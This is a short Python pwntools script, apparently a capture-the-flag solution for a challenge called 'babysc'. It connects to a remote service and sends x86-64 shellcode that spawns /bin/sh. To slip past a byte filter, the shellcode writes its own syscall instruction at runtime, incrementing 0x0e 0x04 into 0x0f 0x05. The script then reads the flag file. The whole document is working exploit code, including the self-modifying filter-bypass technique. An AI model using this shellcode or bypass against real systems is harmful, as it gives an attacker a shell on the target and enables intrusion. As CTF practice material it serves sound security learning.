from pwn import *
elf = context.binary = ELF("./babysc")

# p = process('./babysc')
p = remote("34.133.69.112", 10001)

shellcode = asm(f'''
    xor     rdx, rdx
    mov     rbx, 0x68732f6e69622f2f
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b
    
    lea rcx, [rip]
    mov byte ptr [rcx], 0x0e        /* Write first byte */
    mov byte ptr [rcx+1], 0x04      /* Write second byte */
    inc byte ptr [rcx]              /* 0x0e -> 0x0f */
    inc byte ptr [rcx+1]            /* 0x04 -> 0x05 */
    jmp rcx                         /* Execute syscall */
''')

p.sendlineafter(b'Enter 0x1000', shellcode)
p.sendline(b'cd ../..')
p.sendline(b'cat flag')

flag = p.recvall(timeout=1).strip().decode()
log.success(f"Flag found! {flag}")

p.close()
